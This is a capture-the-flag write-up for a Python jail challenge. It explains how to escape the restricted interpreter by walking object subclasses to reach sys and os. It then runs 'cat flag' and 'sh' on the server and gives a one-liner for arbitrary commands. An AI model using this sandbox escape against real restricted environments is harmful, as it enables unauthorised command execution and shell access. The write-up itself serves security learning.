# Secure import

## Summary 
This challenge is a fairly standard pyjail, which restricts the types of modules we are allowed to use. Als it uses a seperate library to handle imports which means we can't import other libraries(that the coder didn't specify). The pathway in this case is to sort through the subclases of the base class and find a module that exposes dangerous libraries.

# Approach
In order to break out of this pyjail, we must first find a dangerous library that is being loaded. The hacktricks website does a great job of explaining this and gives us a good one liner to use to find these dangerous modules. 
https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes 
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
```
as you can probably see from the one liner, the script finds subclasses that have the sys library loaded into its globals. With that we can access the sys library and import any module we want, including the os library. 

After running this one liner we get some juicy modules to break...
```
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', '_TrivialRe', 'WarningMessage', 'catch_warnings']
```

I merely chose the first one, '_ModuleLock', which happened to be at index 100 so we have a line to access that module...
```python
''.__class__.__base__.suclasses__()[100]
```

then we acces the init properties and the global values so we can use the "sys" library
```python
''.__class__.__base__.__subclasses__()[100].__init__.__globals__["sys"]
```

finally we load the os moduel and access the system function calling "cat flag" in order to actually print out the flag
```python
''.__class__.__base__.__subclasses__()[100].__init__.__globals__["sys"].modules["os"].system("cat flag")
```

PS: You can also use the sh command to get a shell on the server which makes it a bit easier to grab info, and is also much more fun 
```python
''.__class__.__base__.__subclasses__()[100].__init__.__globals__["sys"].modules["os"].system("sh")
```

## Oneliner
Here is the oneliner that can be created to automate this process replacing ls with whatever command you want to run
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
```